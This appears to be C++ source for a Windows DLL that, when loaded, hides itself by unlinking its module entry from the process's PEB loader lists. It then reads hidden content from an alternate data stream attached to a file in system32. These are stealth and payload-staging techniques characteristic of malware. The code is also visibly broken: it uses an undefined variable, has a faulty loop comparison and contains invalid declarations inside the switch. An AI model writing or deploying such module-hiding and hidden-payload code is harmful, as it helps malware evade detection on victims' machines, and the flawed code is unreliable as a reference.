#include <windows.h>
#include <WS2tcpip.h>
#include <iostream>
#include <winternl.h>
#include <stdio.h>

#include "../CommonLib/CommonLib.h"

bool UnlinkModuleFromLdr(PSLIST_ENTRY pHeadLdrDataEntry, WCHAR* moduleName)
{
	PSLIST_ENTRY pCurrentLdrDataEntry = pHeadLdrDataEntry->Flink;
	smPLDR_DATA_TABLE_ENTRY pCurrentLdrData = nullptr;
	while (pHeadLdrDataEntry != pCurrentLdrData)
	{
		pCurrentLdrData = (smPLDR_DATA_TABLE_ENTRY)pCurrentLdrDataEntry;
		if (::wcsstr(proc.c_str(), moduleName))
		{
			pCurrentLdrData->Blink->Flink = pCurrentLdrDataEntry->Flink;
			pCurrentLdrData->Flink->Blink = pCurrentLdrDataEntry->Blink;
			return true;
		}

		// Iterate to next entry
		pCurrentLdrDataEntry = pCurrentLdrDataEntry->Flink;
	}
	return false;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {

		PPEB ppeb;
		smPPEB_LDR_DATA pLdrData;

		WCHAR moduleName[] = L"Grepsdll.dll";
		WCHAR filePath[] = L"C:\\Windows\\system32\\tkup.exe";
		HANDLE streamHandle;
		const DWORD bufferSize = 40000;
		CHAR streamFileBuffer[bufferSize] = { 0 };

		STREAM_INFO_LEVELS sil = FindStreamInfoStandard;
		WIN32_FIND_STREAM_DATA fsd;
    	
    case DLL_PROCESS_ATTACH:
		ppeb = (PPEB)Common::GetPebAddress(::GetCurrentProcess());
		pLdrData = (smPPEB_LDR_DATA)ppeb->Ldr;

		if (!UnlinkModuleFromLdr(&pLdrData->InMemoryOrderModuleList, moduleName))
			return false;

		if (!UnlinkModuleFromLdr(&pLdrData->InLoadOrderModuleList, moduleName))
			return false;

		if (!::FindNextStream(::FindFirstStream(filePath, sil, &fsd, 0), &fsd))
			return false;

		::wcscat(filePath, fsd.cStreamName);

		streamHandle = ::CreateFile(
			filePath,
			GENERIC_READ,
			FILE_SHARE_READ,
			nullptr,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			nullptr);

		if (nullptr == streamHandle)
			return false;

		DWORD bytesRead;
		if (!ReadFile(
			streamHandle,
			streamFileBuffer,
			bufferSize - 1,
			&bytesRead,
			nullptr))
			return false;
    	
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

